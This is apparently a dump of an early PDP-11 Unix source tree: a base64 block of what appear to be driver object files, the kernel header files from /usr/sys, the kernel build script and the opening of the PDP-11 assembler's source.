AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiQAAAAAAiQAAAAAAAAAAAIkAAA
AAAIkAAAAAAAAAAAAAAIgBAAADAAAA+QAAANkAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAJgA
AAACAAAAiAMAAAAAAAD5AAAA2QAAAAAAAAACAAAAAAAAAAAAAAAAAJgAAAACAAAAiAMAAA
AAAAD5AAAA2QAAAAAAAABoAAAACAQAAAAAAAAAAAAAaQAAAAAAAAC4AQAAAAAAAAAAAAAA
AAAAAAAAAAQAAAAAAAAAaQAAAAAA+QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAF9idWYAAAAAIABoAV9iZnJlZWxpIAAYAF9iZGV2c3cAIAAIAF9uYmxrZGV2
IAACAF9jZGV2c3cAIAAKAF9uY2hyZGV2IAACAF91AAAAAAAAIAAiAV9ocF9zaXplIwBQAl
9ocHRhYgAAIAAKAF9ocGJ1ZgAAIAAYAF9ocF9vcGVuIAACAF9ocG9wZW4AIgAAAH5ocG9w
ZW4AAgAAAGNzdgAAAAAAIAAAAEwxAAAAAAAAAgAmAGNyZXQAAAAAIAAAAF9ocHN0cmF0Ig
AqAH5ocHN0cmF0AgAqAGJwAAAAAAAAFAAEAGFicAAAAAAAAQAEAHAxAAAAAAAAFAADAHAy
AAAAAAAAFAACAEwxMDAwMAAAAgBQAEw0AAAAAAAAAgBcAF9pb2RvbmUAIAAAAEwzAAAAAA
AAAgD0AF9scmVtAAAAIAAAAF9sZGl2AAAAIAAAAF9zcGw1AAAAIAAAAEw3AAAAAAAAAgC0
AEw2AAAAAAAAAgDmAEw4AAAAAAAAAgDeAEwxMDAwMQAAAgDKAEw5AAAAAAAAAgDaAEwxMA
AAAAAAAgDwAF9ocHN0YXJ0IgD4AF9zcGwwAAAAIAAAAH5ocHN0YXJ0AgD4AGJwAAAAAAAA
FAAEAEwxMQAAAAAAAgAuAV9yaHN0YXJ0IAAAAF9ocGludHIAIgAyAX5ocGludHIAAgAyAW
JwAAAAAAAAFAAEAGN0cgAAAAAAFAADAEwxMgAAAAAAAgCqAUwxMwAAAAAAAgCQAV9kZXZl
cnJvIAAAAEwxNAAAAAAAAgB6AUwxNQAAAAAAAgBwAUwyMDAwMAAAAgCmAV9ocHJlYWQAIg
CuAX5ocHJlYWQAAgCuAWRldgAAAAAAAQAEAF9ocHBoeXMAIgAEAkwxOAAAAAAAAgDWAV9w
aHlzaW8AIAAAAF9ocHdyaXRlIgDaAX5ocHdyaXRlAgDaAWRldgAAAAAAAQAEAEwyMAAAAA
AAAgAAAn5ocHBoeXMAAgAEAmMAAAAAAAAAFAAEAGRldgAAAAAAAQAEAF9sc2hpZnQAIAAA
AEwyMwAAAAAAAgBKAkwyMgAAAAAAAgBGAmh0Lm8AAG8AbApf4wC2AAwHAaYDAAAAAKQEAA
AAAAAAdwn8/0SdBADERcD/xCUIAAMH9IsAAAQD95UGABkAEQG0igAAABHADDAKAAAAEcAM
8BX//wAADgpmHQQA3wmKANYLdwC6/3cJtv9EnQQAxEXA/zSKAAD1CwYADgPOFRYAZh0EAN
8JigDWC84VFgBmHQQA3wmKANYLzhUGAGYdBADfCYoA1gt3AHb/dwly/0SdBAAHAc4VAQDm
FQAA3wkAANYL94ta//YC3zWAACD18gMAERd0/f/ARfj/HxAo9QcBzhUBAOYVAADfCQAA1g
vfNYAAKvX1A8QlQAAGBgARwEX4/8BVwAIFAQARwEX4/8BVwAQfEDr1BwHOFQEA5hUAAN8J
AADWC8AXKvXARf/PwCUAEPICQB0GAMBVAQAfECD1dwDc/ncJ2P5EHQQAA50KAMNFwP/DDM
NlAAALLRIAEIcLLRIACoPMVQQAAwEOEd8JAAAOEd8JAAAhAcw1AQD2Asw1AQAEAgAdEgCA
CgsQNAoGAPcJiv73C4z+AwI3EYb+BAHAHYL+MBEGADcRev73i27+AgL3CQgA9wlk/ncAYP
53CVz+xB1e/mEDA50KAMAQF3T9/8BF+P8fECj1wyVAAAYGwBDARfj/wFXAAgUBwBDARfj/
wFXABB8QOvXDRcD/wBDADAIcAADziwAABAXfNYAAIPUJAsxVBAA3HQYABv4OEd8JAADOAQ
ItEgAfA/eVAQDs/QItEgAJg4AQAO0SAB8QJvXfFVkAIPUgAfQLEgAEAt8VRwAg9RkBAB0S
AIDgHxAm9d8VWwAg9RAB95UCAK79zhU89QAdDADADCYQ5hUm9SYR3wkAAMZlBgB3AJD9dw
mM/cQdjv1PAwOdCgDDRcD/3zUAQCD1KgPfNQQAKvUJA8QlAAAGA/OLAAADA/OV//8AAN8V
CUAg9d81gAAq9RED96UCAEj9DQK3ikP996UKAD39BwfAEMAMsAoAADeKLv0gAcxVBAD3lQ
IAIv33pQIAHP0SAjeKF/3AEMAMsAoAADcdBgAO/TeKBP0OEd8JAAD0Fyb1FgAFAcAQwAww
HRIAAAD3CYj+dwDk/HcJ4PxOHQQA3wl4A84VAQBmHQQA5hUAAOYVJAHfCQAAxmUGAMAd0v
wACzcQ9vx3ALL8dwmu/E4dBADfCXgDDgpmHQQA5hUAAOYVJAHfCQAAxmUGADcKzPx3AIj8
dwmE/ESdBADOFff/5hVCAN8JAADWCwMQABHADPAQAACDCgARwAzwEAAAdwBa/AAAGQEAAA
AAAAAAAAAAAAAAAAAAmAAAAAAAAABpAAAAAACYAAAAAAAAAKgAAAAAAAAAAAC4AAAAAAAA
AAAAAgAAAAAAaQEAABkBAAAAAAAAAAAAAJgAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAA
AAAAAAAgAAAAAAAAAAAAAAAAACAAAAAABpAQAAGQEAAAAAAAAAAAAAAAA4AgAASAIAAAAA
eQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADgCAABIAgAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOAIAAEgCAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAaQEAABkBAAAAAAAAAAAAAAAAAAAAALgAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAEgDAAAAAFgDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIkD
AAB5AAAAAAB5AAAAAAB5AAAAAAAAAHkAAAB5AAAAAAADAAAA2QMAAGkBAAAZAQAAeQAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAKgAAACYAAAAAAAAAAAAAAAAAAAAAAAAAHkAAAAAAFgDAAAAAAAAAAAAAAAAeQ
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAB5AAAAAAAAAAAAAAAAAAAAAAAAAAAAuAQAAAAAAABpAQAAGQEAAHkAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIgAAAAAAJgAAAAAAAAAmAAAAAAAAAAAAAAAAAAA
AAAAAAB5AAAAAAB5AAAAAAB5AAAAAAAAAAAAqAAAAHkAAAAAAAAAAAAAAHkAAAAAAHkAAA
AAAHkAAAAAAAAAqAAAAAAAeQAAAHkAAAAAAFgDAAAAAAAAAAAAAAAAAAAAAKgAAAADAAAA
aQEAABkBAAAAAAAAAgAAAAAAAAAAAAAAiAAAAAIAAACoBQAAAAAAAIkAAAAAAGkAAABpAQ
AAGQEAAAAAAAACAAAAAAAAAAAAiAAAAAIAAACoBQAAAAAAAGkAAABpAQAAGQEAAAAAAAAA
AAAAaAAAACgGAAAAAAAAAAAAAKgAAAAAAAAAAAC4AAAAaQFfYnVmAAAAACAAaAFfYmZyZW
VsaSAAGABfYmRldnN3ACAACABfbmJsa2RldiAAAgBfY2RldnN3ACAACgBfbmNocmRldiAA
AgBfdQAAAAAAACAAIgFfaHR0YWIAACAACgBfcmh0YnVmACAAGABfaF9vcGVuZiAACABfaF
9ibGtubyAAEABfaF9ueHJlYyAAEABfaHRvcGVuACIAAAB+aHRvcGVuAAIAAABmbGFnAAAA
AAEABgB1bml0AAAAABQABABkZXYAAAAAAAEABABjc3YAAAAAACAAAABMMTAwMDAAAAIAGA
BMMgAAAAAAAAIAIABMMQAAAAAAAAIAQgBfaGNvbW1hbiIAigBjcmV0AAAAACAAAABfaHRj
bG9zZSIARgB+aHRjbG9zZQIARgBmbGFnAAAAAAEABgB1bml0AAAAABQABABkZXYAAAAAAA
EABABMNQAAAAAAAAIAeAB+aGNvbW1hbgIAigB1bml0AAAAABQABABkZXYAAAAAAAEABABj
b20AAAAAAAEABgBMNwAAAAAAAAIAogBMMTAwMDEAAAIAlABfbGJvbHQAACAAAABfc2xlZX
AAACAAAABMOQAAAAAAAAIAzgBMMjAwMDIAAAIAwABMMTEAAAAAAAIA6ABMMjAwMDMAAAIA
8gBMMTMAAAAAAAIABgFMMjAwMDUAAAIA+ABfaHRzdHJhdCIAJAF+aHRzdHJhdAIAJAFicA
AAAAAAABQABABhYnAAAAAAAAEABABwAAAAAAAAABQAAwBMMTYAAAAAAAIAYAFMMTcAAAAA
AAIAWgFMMjAwMDcAAAIAUgFMMjAwMDkAAAIATAFfY2xyYnVmACAAAABfaW9kb25lACAAAA
BMMTUAAAAAAAIAnAFMMTkAAAAAAAIAbgFfc3BsNQAAACAAAABMMjAAAAAAAAIAggFMMjEA
AAAAAAIAigFMMjIAAAAAAAIAmAFfaHRzdGFydCIAoAFfc3BsMAAAACAAAAB+aHRzdGFydA
IAoAFicAAAAAAAABQABAB1bml0AAAAABQAAwBibGtubwAAABQAAgBMMjQAAAAAAAIApAFM
MjMAAAAAAAIAbAJMMjUAAAAAAAIAzgFMMjAwMTAAAAIA2AFMMTAwMDIAAAIA9gFMMjcAAA
AAAAIACAJMMjgAAAAAAAIATAJMMjkAAAAAAAIALAJMMzEAAAAAAAIAOgJfcmhzdGFydCAA
AABfaHRpbnRyACIAcAJ+aHRpbnRyAAIAcAJicAAAAAAAABQABAB1bml0AAAAABQAAwBMMz
MAAAAAAAIAGANMMzQAAAAAAAIA3gJMMzUAAAAAAAIApAJMMzcAAAAAAAIA1AJMNDAAAAAA
AAIAFANMMzkAAAAAAAIACgNfaHRyZWFkACIAHAN+aHRyZWFkAAIAHANkZXYAAAAAAAEABA
BfaHRwaHlzACIAeANfcGh5c2lvACAAAABfaHR3cml0ZSIATgN+aHR3cml0ZQIATgNkZXYA
AAAAAAEABAB+aHRwaHlzAAIAeAN1bml0AAAAABQABABhAAAAAAAAABQAAwBkZXYAAAAAAA
EABABfbHNoaWZ0ACAAAABocy5vAABvAGwKVOMAtqAEBwE0AQAAAAAoAgAAAAAAAHcJ/P9E
HQQAwxUABPSlCAAKAAIGwxUACPQgEgAGgsxVBAAOEd8JAAAXATQKBgD3Cc7/9wvQ/wMCNx
HK/wQBwB3G/zARBgA3Eb7/94uy/wIC9wkIAPcJqP93AKT/dwmg/8Qdov8bA7eKlv8DHRIA
9KUIAAoAAQfDDACdCgDARfj/HxAo9M4VOPTAEMAMJhDmFSb0JhHfCQAAxmUGAHcAYP93CV
z/94tY/yQDxB1Y/zeKTv/fNQBAIPQSAw4K5hco9CYR3wkAAJYl3xUJACD0t4ov//elCgAp
/woEzFUEADeKH/83HQYAHv8OEd8JAAD3CWr/dwAK/3cJBv/OFQEAZh0EAOYVAADmFQAA3w
kAAMZlBgB3AOr+dwnm/g4KZh0EAOYVAADmFQAA3wkAAMZlBgB3AMz+AADpAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYAQAAAAAAAAAAOQEAAHkAAAAAAHkAAAAAAH
kAAAAAAAAAeQAAAHkAAAAAAAMAAACJAQAAmQEAAOkAAAB5AAAAAAB5AAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AEAAAAAAACZAQAA6QAAAHkAAA
AAAHkAAAB5AAAAAAAAAAAAAAAAAAAAAAAAAFgCAAAAAAAAAAAAAHkAAAAAAHkAAAAAAAAA
AAB5AAAAAAB5AAAAAAAYAQAAAwAAAJkBAADpAAAAAAAAAAAAAACIAAAAAgAAAKgCAAAAAA
AAmQEAAOkAAAAAAAAAAACIAAAAAgAAAKgCAAAAAAAAmQFfYnVmAAAAACAAaAFfYmZyZWVs
aSAAGABfYmRldnN3ACAACABfbmJsa2RldiAAAgBfY2RldnN3ACAACgBfbmNocmRldiAAAg
BfdQAAAAAAACAAIgFfaHN0YWIAACAACgBfcmhzYnVmACAAGABfaHNzdHJhdCIAAAB+aHNz
dHJhdAIAAABicAAAAAAAABQABABhYnAAAAAAAAEABABtYmxrcwAAABQAAwBjc3YAAAAAAC
AAAABMMgAAAAAAAAIAGABMMwAAAAAAAAIAKgBfaW9kb25lACAAAABMMQAAAAAAAAIAWABf
c3BsNQAAACAAAABMNAAAAAAAAAIAPgBMNQAAAAAAAAIARgBMNgAAAAAAAAIAVABfaHNzdG
FydCIAXABfc3BsMAAAACAAAABjcmV0AAAAACAAAAB+aHNzdGFydAIAXABicAAAAAAAABQA
BABhZGRyAAAAABQAAwBMNwAAAAAAAAIAnABMOAAAAAAAAAIAeABfcmhzdGFydCAAAABfaH
NpbnRyACIAoAB+aHNpbnRyAAIAoABicAAAAAAAABQABABMOQAAAAAAAAIA8gBMMTAAAAAA
AAIA3gBfZGV2ZXJybyAAAABMMjAwMDAAAAIA7gBfaHNyZWFkACIA9gB+aHNyZWFkAAIA9g
BkZXYAAAAAAAEABABfcGh5c2lvACAAAABfaHN3cml0ZSIAFgF+aHN3cml0ZQIAFgFkZXYA
AAAAAAEABAA=
-- /usr/sys/param.h mode=0100664 uid=3 gid=3 atime=174923444 mtime=169261008 --
/*
 * tunable variables
 */

#define	NBUF	15		/* size of buffer cache */
#define	NINODE	100		/* number of in core inodes */
#define	NFILE	100		/* number of in core file structures */
#define	NMOUNT	5		/* number of mountable file systems */
#define	NEXEC	3		/* number of simultaneous exec's */
#define	MAXMEM	(64*32)		/* max core per process - first # is Kw */
#define	SSIZE	20		/* initial stack size (*64 bytes) */
#define	SINCR	20		/* increment of stack (*64 bytes) */
#define	NOFILE	15		/* max open files per process */
#define	CANBSIZ	256		/* max size of typewriter line */
#define	CMAPSIZ	100		/* size of core allocation area */
#define	SMAPSIZ	100		/* size of swap allocation area */
#define	NCALL	20		/* max simultaneous time callouts */
#define	NPROC	50		/* max number of processes */
#define	NTEXT	40		/* max number of pure texts */
#define	NCLIST	100		/* max total clist size */
#define	HZ	60		/* Ticks/second of the clock */

/*
 * priorities
 * probably should not be
 * altered too much
 */

#define	PSWP	-100
#define	PINOD	-90
#define	PRIBIO	-50
#define	PPIPE	1
#define	PWAIT	40
#define	PSLEP	90
#define	PUSER	100

/*
 * signals
 * dont change
 */

#define	NSIG	20
#define		SIGHUP	1	/* hangup */
#define		SIGINT	2	/* interrupt (rubout) */
#define		SIGQIT	3	/* quit (FS) */
#define		SIGINS	4	/* illegal instruction */
#define		SIGTRC	5	/* trace or breakpoint */
#define		SIGIOT	6	/* iot */
#define		SIGEMT	7	/* emt */
#define		SIGFPT	8	/* floating exception */
#define		SIGKIL	9	/* kill */
#define		SIGBUS	10	/* bus error */
#define		SIGSEG	11	/* segmentation violation */
#define		SIGSYS	12	/* sys */
#define		SIGPIPE	13	/* end of pipe */

/*
 * fundamental constants
 * cannot be changed
 */

#define	USIZE	16		/* size of user block (*64) */
#define	NULL	0
#define	NODEV	(-1)
#define	ROOTINO	1		/* i number of all roots */
#define	DIRSIZ	14		/* max characters per directory */

/*
 * structure to access an
 * integer in bytes
 */
struct
{
	char	lobyte;
	char	hibyte;
};

/*
 * structure to access an integer
 */
struct
{
	int	integ;
};

/*
 * Certain processor registers
 */
#define PS	0177776
#define KL	0177560
#define SW	0177570
-- /usr/sys/proc.h mode=0100664 uid=3 gid=3 atime=174923444 mtime=174907689 --
/*
 * One structure allocated per active
 * process. It contains all data needed
 * about the process while the
 * process may be swapped out.
 * Other per process data (user.h)
 * is swapped with the process.
 */
struct	proc
{
	char	p_stat;
	char	p_flag;
	char	p_pri;		/* priority, negative is high */
	char	p_sig;		/* signal number sent to this process */
	char	p_uid;		/* user id, used to direct tty signals */
	char	p_time;		/* resident time for scheduling */
	char	p_cpu;		/* cpu usage for scheduling */
	char	p_nice;		/* nice for scheduling */
	int	p_ttyp;		/* controlling tty */
	int	p_pid;		/* unique process id */
	int	p_ppid;		/* process id of parent */
	int	p_addr;		/* address of swappable image */
	int	p_size;		/* size of swappable image (*64 bytes) */
	int	p_wchan;	/* event process is awaiting */
	int	*p_textp;	/* pointer to text structure */
} proc[NPROC];

/* stat codes */
#define	SSLEEP	1		/* sleeping on high priority */
#define	SWAIT	2		/* sleeping on low priority */
#define	SRUN	3		/* running */
#define	SIDL	4		/* intermediate state in process creation */
#define	SZOMB	5		/* intermediate state in process termination */
#define	SSTOP	6		/* process being traced */

/* flag codes */
#define	SLOAD	01		/* in core */
#define	SSYS	02		/* scheduling process */
#define	SLOCK	04		/* process cannot be swapped */
#define	SSWAP	010		/* process is being swapped out */
#define	STRC	020		/* process is being traced */
#define	SWTED	040		/* another tracing flag */
-- /usr/sys/reg.h mode=0100664 uid=3 gid=3 atime=174921997 mtime=169261008 --
/*
 * Location of the users' stored
 * registers relative to R0.
 * Usage is u.u_ar0[XX].
 */
#define	R0	(0)
#define	R1	(-2)
#define	R2	(-9)
#define	R3	(-8)
#define	R4	(-7)
#define	R5	(-6)
#define	R6	(-3)
#define	R7	(1)
#define	RPS	(2)

#define	TBIT	020		/* PS trace bit */
-- /usr/sys/run mode=0100664 uid=3 gid=3 atime=174922111 mtime=174917065 --
chdir ken
cc -c -O *.c
ar r ../lib1
rm *.o

chdir ../dmr
cc -c -O *.c
ar r ../lib2
rm *.o

chdir ../conf
as m40.s
mv a.out m40.o
: as m45.s
: mv a.out m45.o
: cc sysfix.c
: mv a.out sysfix
cc mkconf.c
mv a.out mkconf

mkconf
rk
tm
tc
done

cc -c c.c
as l.s
ld -x a.out m40.o c.o ../lib1 ../lib2
: as data.s l.s
: ld -x -r -d a.out m45.o c.o ../lib1 ../lib2
: nm -ug
: sysfix a.out x
: mv x a.out
cmp a.out /rkunix
cp a.out /rkunix

mkconf
rp
tm
tc
done

cc -c c.c
as l.s
ld -x a.out m40.o c.o ../lib1 ../lib2
: as data.s l.s
: ld -x -r -d a.out m45.o c.o ../lib1 ../lib2
: nm -ug
: sysfix a.out x
: mv x a.out
cmp a.out /rpunix
cp a.out /rpunix

mkconf
hp
tm
tc
done

cc -c c.c
as l.s
ld -x a.out m40.o c.o ../lib1 ../lib2
: as data.s l.s
: ld -x -r -d a.out m45.o c.o ../lib1 ../lib2
: nm -ug
: sysfix a.out x
: mv x a.out
cmp a.out /hpunix
cp a.out /hpunix

rm mkconf c.c l.s a.out *.o
: rm sysfix
-- /usr/sys/seg.h mode=0100664 uid=3 gid=3 atime=174921929 mtime=174907722 --
/*
 * KT-11 addresses and bits.
 */

#define	UISD	0177600		/* first user I-space descriptor register */
#define	UISA	0177640		/* first user I-space address register */
#define	UDSA	0177660		/* first user D-space address register */
#define	RO	02		/* access abilities */
#define	WO	04
#define	RW	06
#define	ED	010		/* extend direction */

/*
 * structure used to address
 * a sequence of integers.
 */
struct
{
	int	r[];
};
int	*ka6;		/* 11/40 KISA6; 11/45 KDSA6 */

/*
 * address to access 11/70 UNIBUS map
 */
#define	UBMAP	0170200
-- /usr/sys/systm.h mode=0100664 uid=3 gid=3 atime=174921996 mtime=169261009 --
/*
 * Random set of variables
 * used by more than one
 * routine.
 */
char	canonb[CANBSIZ];	/* buffer for erase and kill (#@) */
int	coremap[CMAPSIZ];	/* space for core allocation */
int	swapmap[SMAPSIZ];	/* space for swap allocation */
int	*rootdir;		/* pointer to inode of root directory */
int	cputype;		/* type of cpu =40, 45, or 70 */
int	execnt;			/* number of processes in exec */
int	lbolt;			/* time of day in 60th not in time */
int	time[2];		/* time in sec from 1970 */
int	tout[2];		/* time of day of next sleep */
/*
 * The callout structure is for
 * a routine arranging
 * to be called by the clock interrupt
 * (clock.c) with a specified argument,
 * in a specified amount of time.
 * Used, for example, to time tab
 * delays on teletypes.
 */
struct	callo
{
	int	c_time;		/* incremental time */
	int	c_arg;		/* argument to routine */
	int	(*c_func)();	/* routine */
} callout[NCALL];
/*
 * Mount structure.
 * One allocated on every mount.
 * Used to find the super block.
 */
struct	mount
{
	int	m_dev;		/* device mounted */
	int	*m_bufp;	/* pointer to superblock */
	int	*m_inodp;	/* pointer to mounted on inode */
} mount[NMOUNT];
int	mpid;			/* generic for unique process id's */
char	runin;			/* scheduling flag */
char	runout;			/* scheduling flag */
char	runrun;			/* scheduling flag */
char	curpri;			/* more scheduling */
int	maxmem;			/* actual max memory per process */
int	*lks;			/* pointer to clock device */
int	rootdev;		/* dev of root see conf.c */
int	swapdev;		/* dev of swap see conf.c */
int	swplo;			/* block number of swap space */
int	nswap;			/* size of swap space */
int	updlock;		/* lock for sync */
int	rablock;		/* block to be read ahead */
char	regloc[];		/* locs. of saved user registers (trap.c) */
-- /usr/sys/text.h mode=0100664 uid=3 gid=3 atime=174921794 mtime=169261009 --
/*
 * Text structure.
 * One allocated per pure
 * procedure on swap device.
 * Manipulated by text.c
 */
struct text
{
	int	x_daddr;	/* disk address of segment */
	int	x_caddr;	/* core address, if loaded */
	int	x_size;		/* size (*64) */
	int	*x_iptr;	/* inode of prototype */
	char	x_count;	/* reference count */
	char	x_ccount;	/* number of loaded references */
} text[NTEXT];
-- /usr/sys/tty.h mode=0100664 uid=3 gid=3 atime=174923445 mtime=169261009 --
/*
 * A clist structure is the head
 * of a linked list queue of characters.
 * The characters are stored in 4-word
 * blocks containing a link and 6 characters.
 * The routines getc and putc (m45.s or m40.s)
 * manipulate these structures.
 */
struct clist
{
	int	c_cc;		/* character count */
	int	c_cf;		/* pointer to first block */
	int	c_cl;		/* pointer to last block */
};

/*
 * A tty structure is needed for
 * each UNIX character device that
 * is used for normal terminal IO.
 * The routines in tty.c handle the
 * common code associated with
 * these structures.
 * The definition and device dependent
 * code is in each driver. (kl.c dc.c dh.c)
 */
struct tty
{
	struct	clist t_rawq;	/* input chars right off device */
	struct	clist t_canq;	/* input chars after erase and kill */
	struct	clist t_outq;	/* output list to device */
	int	t_flags;	/* mode, settable by stty call */
	int	*t_addr;	/* device address (register or startup fcn) */
	char	t_delct;	/* number of delimiters in raw q */
	char	t_col;		/* printing column of device */
	char	t_erase;	/* erase character */
	char	t_kill;		/* kill character */
	char	t_state;	/* internal state, not visible externally */
	char	t_char;		/* character temporary */
	int	t_speeds;	/* output+input line speed */
	int	t_dev;		/* device name */
};

char partab[];			/* ASCII table: parity, character class */

#define	TTIPRI	10
#define	TTOPRI	20

#define	CERASE	'#'		/* default special characters */
#define	CEOT	004
#define	CKILL	'@'
#define	CQUIT	034		/* FS, cntl shift L */
#define	CINTR	0177		/* DEL */

/* limits */
#define	TTHIWAT	50
#define	TTLOWAT	30
#define	TTYHOG	256

/* modes */
#define	HUPCL	01
#define	XTABS	02
#define	LCASE	04
#define	ECHO	010
#define	CRMOD	020
#define	RAW	040
#define	ODDP	0100
#define	EVENP	0200
#define	NLDELAY	001400
#define	TBDELAY	006000
#define	CRDELAY	030000
#define	VTDELAY	040000

/* Hardware bits */
#define	DONE	0200
#define	IENABLE	0100

/* Internal state bits */
#define	TIMEOUT	01		/* Delay timeout in progress */
#define	WOPEN	02		/* Waiting for open to complete */
#define	ISOPEN	04		/* Device is open */
#define	SSTART	010		/* Has special start routine at addr */
#define	CARR_ON	020		/* Software copy of carrier-present */
#define	BUSY	040		/* Output in progress */
#define	ASLEEP	0100		/* Wakeup when output done */
-- /usr/sys/user.h mode=0100664 uid=3 gid=3 atime=174923445 mtime=174907762 --
/*
 * The user structure.
 * One allocated per process.
 * Contains all per process data
 * that doesn't need to be referenced
 * while the process is swapped.
 * The user block is USIZE*64 bytes
 * long; resides at virtual kernel
 * loc 140000; contains the system
 * stack per user; is cross referenced
 * with the proc structure for the
 * same process.
 */
struct user
{
	int	u_rsav[2];		/* save r5,r6 when exchanging stacks */
	int	u_fsav[25];		/* save fp registers */
					/* rsav and fsav must be first in structure */
	char	u_segflg;		/* flag for IO; user or kernel space */
	char	u_error;		/* return error code */
	char	u_uid;			/* effective user id */
	char	u_gid;			/* effective group id */
	char	u_ruid;			/* real user id */
	char	u_rgid;			/* real group id */
	int	u_procp;		/* pointer to proc structure */
	char	*u_base;		/* base address for IO */
	char	*u_count;		/* bytes remaining for IO */
	char	*u_offset[2];		/* offset in file for IO */
	int	*u_cdir;		/* pointer to inode of current directory */
	char	u_dbuf[DIRSIZ];		/* current pathname component */
	char	*u_dirp;		/* current pointer to inode */
	struct	{			/* current directory entry */
		int	u_ino;
		char	u_name[DIRSIZ];
	} u_dent;
	int	*u_pdir;		/* inode of parent directory of dirp */
	int	u_uisa[16];		/* prototype of segmentation addresses */
	int	u_uisd[16];		/* prototype of segmentation descriptors */
	int	u_ofile[NOFILE];	/* pointers to file structures of open files */
	int	u_arg[5];		/* arguments to current system call */
	int	u_tsize;		/* text size (*64) */
	int	u_dsize;		/* data size (*64) */
	int	u_ssize;		/* stack size (*64) */
	int	u_sep;			/* flag for I and D separation */
	int	u_qsav[2];		/* label variable for quits and interrupts */
	int	u_ssav[2];		/* label variable for swapping */
	int	u_signal[NSIG];		/* disposition of signals */
	int	u_utime;		/* this process user time */
	int	u_stime;		/* this process system time */
	int	u_cutime[2];		/* sum of childs' utimes */
	int	u_cstime[2];		/* sum of childs' stimes */
	int	*u_ar0;			/* address of users saved R0 */
	int	u_prof[4];		/* profile arguments */
	char	u_intflg;		/* catch intr from sys */
					/* kernel stack per user
					 * extends from u + USIZE*64
					 * backward not to reach here
					 */
} u;

/* u_error codes */
#define	EFAULT	106
#define	EPERM	1
#define	ENOENT	2
#define	ESRCH	3
#define	EINTR	4
#define	EIO	5
#define	ENXIO	6
#define	E2BIG	7
#define	ENOEXEC	8
#define	EBADF	9
#define	ECHILD	10
#define	EAGAIN	11
#define	ENOMEM	12
#define	EACCES	13
#define	ENOTBLK	15
#define	EBUSY	16
#define	EEXIST	17
#define	EXDEV	18
#define	ENODEV	19
#define	ENOTDIR	20
#define	EISDIR	21
#define	EINVAL	22
#define	ENFILE	23
#define	EMFILE	24
#define	ENOTTY	25
#define	ETXTBSY	26
#define	EFBIG	27
#define	ENOSPC	28
#define	ESPIPE	29
#define	EROFS	30
#define	EMLINK	31
#define	EPIPE	32
-- /usr/tmp mode=0140777 uid=3 gid=3 atime=174929504 mtime=174916711 --
-- /usr/source mode=0140775 uid=3 gid=3 atime=174930162 mtime=174930162 --
-- /usr/source/as mode=0140775 uid=3 gid=3 atime=174930100 mtime=174920374 --
-- /usr/source/as/as11.s mode=0100664 uid=3 gid=3 atime=174922114 mtime=174844064 --
/
/

/ PDP-11 assembler pass 0

indir	= 0

	jmp	start
go:
	jsr	pc,assem
	movb	pof,r0
	sys	write; outbuf; 512.
	movb	pof,r0
	sys	close
	movb	fbfil,r0
	sys	close
	tstb	errflg
	bne	aexit
	jsr	r5,fcreat; a.tmp3
	mov	r0,r1
	mov	symend,0f
	sub	$usymtab,0f
	sys	indir; 9f
	.data
9:	sys	write; usymtab; 0:..
	.text
	mov	r1,r0
	sys	close
	sys	exec; 2f; 1f
	mov	$2f,r0
	jsr	r5,filerr; "?\n

aexit:
	sys	unlink; a.tmp1
	sys	unlink; a.tmp2
	sys	unlink; a.tmp3
	sys	exit
.data
1:
	2f
	a.tmp1
	a.tmp2
	a.tmp3
unglob:
	3f
	0
	.text
2:
fpass2:
	</lib/as2\0>
3:
	<-g\0>
	.even

filerr:
	mov	r4,-(sp)
	mov	r0,r4
	mov	r4,0f
	clr	r0
1:
	tstb	(r4)+
	beq	1f
	inc	r0
	br	1b
1:
	mov	r0,1f
	mov	$1,r0
	sys	indir; 9f
	.data
9:	sys	write; 0:0; 1:0
	.text
	mov	r5,0f
	mov	$1,r0
	sys	indir; 9f
	.data
9:	sys	write; 0:0; 2
	.text
	tst	(r5)+
	mov	(sp)+,r4
	rts	r5

fcreat:
	mov	r4,-(sp)
	mov	(r5)+,r4
	mov	r4,0f
1:
	sys	indir; 9f
	.data
9:	sys	stat; 0:..; outbuf
	.text
	bec	2f
	mov	r4,0f
	sys	indir; 9f
	.data
9:	sys	creat; 0:..; 444
	.text
	bes	2f
	mov	(sp)+,r4
	rts	r5
2:
	incb	9.(r4)
	cmpb	9.(r4),$'z
	blos	1b
	mov	r4,r0
	jsr	r5,filerr; "?\n
	sys	exit
-- /usr/source/as/as12.s mode=0100664 uid=3 gid=3 atime=174922114 mtime=174844069 --
/
/

/ a2 -- pdp-11 assembler pass 1

error:
	incb	errflg
	mov	r0,-(sp)
	mov	r1,-(sp)
	mov	(r5)+,r0
	tst	*curarg
	beq	1f
	mov	r0,-(sp)
	mov	*curarg,r0
	clr	*curarg
	jsr	r5,filerr; '\n
	mov	(sp)+,r0
1:
	mov	r2,-(sp)
	mov	r3,-(sp)
	mov	line,r3
	movb	r0,1f
	mov	$1f+6,r0
	mov	$4,r1
2:
	clr	r2
	dvd	$10.,r2
	add	$'0,r3
	movb	r3,-(r0)
	mov	r2,r3
	sob	r1,2b
	mov	$1,r0
	sys	write; 1f; 7
	mov	(sp)+,r3
	mov	(sp)+,r2
	mov	(sp)+,r1
	mov	(sp)+,r0
	rts	r5

	.data
1:	<f xxxx\n>
	.even
	.text

betwen:
	cmp	r0,(r5)+
	blt	1f
	cmp	(r5)+,r0
	blt	2f
1:
